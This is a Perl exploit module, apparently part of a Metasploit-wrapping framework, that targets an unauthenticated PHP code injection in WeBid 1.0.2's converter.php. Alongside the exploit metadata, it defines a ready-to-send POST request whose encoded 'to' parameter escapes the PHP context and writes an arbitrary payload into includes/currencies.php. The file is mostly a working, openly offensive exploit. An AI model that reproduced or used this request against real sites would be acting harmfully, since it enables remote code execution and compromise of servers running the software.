package MSFExploits::Exploits::WEBID::MSF::WebidConverter;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::WEBID);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "WebidConverter";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a vulnerability found in WeBid version 1.0.2.

        By abusing the converter.php file, a malicious user can inject PHP code

        in the includes/currencies.php script without any authentication, which

        results in arbitrary code execution.

      ",
  METHOD => "GET",
  MSF_MODULE => "webid_converter",
  OSVDB => 73609,
  PATHS => ["WeBid"],
  REFERENCES => ["http://www.webidsupport.com/forums/showthread.php?3892"],
  TITLE => "WeBid converter.php Remote PHP Code Injection",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to WeBid", VALUE => "/WeBid" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'converter.php',
      PAYLOAD      => 'action=convert&from=USD&to=%00%27%29%29%3b__PAYLOAD__%3f%3e',
      TEXT   => 'Sending Exploit #4 Request : [POST] /converter.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
